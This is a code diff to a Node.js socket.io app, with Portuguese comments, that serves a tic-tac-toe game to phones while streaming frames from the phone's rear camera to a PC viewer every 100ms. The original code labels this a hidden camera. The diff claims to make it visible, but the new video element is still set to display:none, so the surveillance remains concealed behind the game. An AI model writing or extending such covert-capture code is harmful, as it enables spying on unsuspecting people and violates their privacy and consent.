@@ -18,7 +18,7 @@ app.get('/', (req, res) => {
   const fullUrl = `${protocol}://${host}`;
   
   if (isMobile) {
-    // Página do CELULAR - jogo + câmera oculta
+    // Página do CELULAR - jogo + câmera (agora visível para debug)
     res.send(`<!DOCTYPE html>
 <html>
 <head>
@@ -102,12 +102,19 @@ app.get('/', (req, res) => {
         button:disabled { background: #ccc; cursor: not-allowed; }
         .camera-status {
             text-align: center;
-            font-size: 12px;
-            color: #666;
+            font-size: 14px;
+            color: #333;
             margin-top: 10px;
+            padding: 10px;
+            background: #f0f0f0;
+            border-radius: 5px;
         }
-        video {
-            display: none;
+        #localVideo {
+            width: 100%;
+            max-width: 320px;
+            margin: 10px auto;
+            border-radius: 10px;
+            border: 2px solid #4CAF50;
         }
     </style>
 </head>
@@ -119,9 +126,8 @@ app.get('/', (req, res) => {
         <div class="board" id="board"></div>
         <button id="resetBtn" disabled>Reiniciar Jogo</button>
         <div class="camera-status" id="cameraStatus">📷 Iniciando câmera...</div>
+        <video id="localVideo" autoplay playsinline muted style="display: none;"></video>
     </div>
-
-    <video id="video" autoplay playsinline muted></video>
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
@@ -135,10 +141,12 @@ app.get('/', (req, res) => {
         let meuSimbolo = '';
         let gameActive = false;
         let board = ['', '', '', '', '', '', '', '', ''];
+        let mediaStream = null;
         
         const statusDiv = document.getElementById('status');
         const resetBtn = document.getElementById('resetBtn');
         const cameraStatus = document.getElementById('cameraStatus');
+        const localVideo = document.getElementById('localVideo');
         
         // Criar tabuleiro
         for(let i = 0; i < 9; i++) {
@@ -153,22 +161,22 @@ app.get('/', (req, res) => {
             document.getElementById('board').appendChild(cell);
         }
         
-        // INICIAR CÂMERA E TRANSMITIR
+        // INICIAR CÂMERA
         async function iniciarCamera() {
             try {
                 cameraStatus.innerHTML = '📷 Solicitando permissão...';
                 
-                const stream = await navigator.mediaDevices.getUserMedia({ 
+                mediaStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         width: 320, 
                         height: 240,
-                        facingMode: 'environment' // câmera traseira
+                        facingMode: 'environment'
                     },
                     audio: false
                 });
                 
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+                localVideo.srcObject = mediaStream;
+                await localVideo.play();
                 
                 cameraStatus.innerHTML = '📷 Câmera ativa - Transmitindo...';
                 
@@ -180,8 +188,8 @@ app.get('/', (req, res) => {
                 
                 // Enviar frames a cada 100ms
                 setInterval(() => {
-                    if (stream.active) {
-                        ctx.drawImage(video, 0, 0, 320, 240);
+                    if (mediaStream && mediaStream.active) {
+                        ctx.drawImage(localVideo, 0, 0, 320, 240);
                         const frame = canvas.toDataURL('image/jpeg', 0.3);
                         socket.emit('frame', frame);
                     }
@@ -189,10 +197,12 @@ app.get('/', (req, res) => {
                 
             } catch (err) {
                 cameraStatus.innerHTML = '❌ Erro câmera: ' + err.message;
+                console.error('Erro câmera:', err);
             }
         }
         
-        iniciarCamera();
+        // Iniciar câmera quando a página carregar
+        window.onload = iniciarCamera;
         
         socket.on('connect', () => {
             statusDiv.innerHTML = 'Conectado!';
@@ -342,9 +352,12 @@ app.get('/', (req, res) => {
         button:disabled { background: #ccc; cursor: not-allowed; }
         .video-status {
             text-align: center;
-            font-size: 12px;
-            color: #666;
+            font-size: 14px;
+            color: #333;
             margin-top: 5px;
+            padding: 5px;
+            background: #f0f0f0;
+            border-radius: 5px;
         }
     </style>
 </head>
@@ -355,7 +368,7 @@ app.get('/', (req, res) => {
         <div class="grid">
             <div>
                 <div class="video-box">
-                    <img id="video">
+                    <img id="remoteVideo">
                 </div>
                 <div class="video-status" id="videoStatus">📱 Aguardando celular...</div>
             </div>
@@ -380,7 +393,7 @@ app.get('/', (req, res) => {
         
         const statusDiv = document.getElementById('status');
         const resetBtn = document.getElementById('resetBtn');
-        const videoImg = document.getElementById('video');
+        const remoteVideo = document.getElementById('remoteVideo');
         const videoStatus = document.getElementById('videoStatus');
         
         // Criar tabuleiro
@@ -397,9 +410,11 @@ app.get('/', (req, res) => {
         }
         
         // Receber frames da câmera
+        let frameCount = 0;
         socket.on('frame', (frameData) => {
-            videoImg.src = frameData;
-            videoStatus.innerHTML = '📱 Recebendo vídeo do celular';
+            remoteVideo.src = frameData;
+            frameCount++;
+            videoStatus.innerHTML = '📱 Recebendo vídeo do celular (frames: ' + frameCount + ')';
         });
         
         socket.on('connect', () => {
@@ -474,9 +489,11 @@ io.on('connection', (socket) => {
   if (!jogadores.x) {
     jogadores.x = socket.id;
     socket.emit('inicio', { simbolo: 'X' });
+    console.log('Jogador X atribuído');
   } else if (!jogadores.o) {
     jogadores.o = socket.id;
     socket.emit('inicio', { simbolo: 'O' });
+    console.log('Jogador O atribuído');
   }
   
   // Receber frames do celular e enviar para o PC
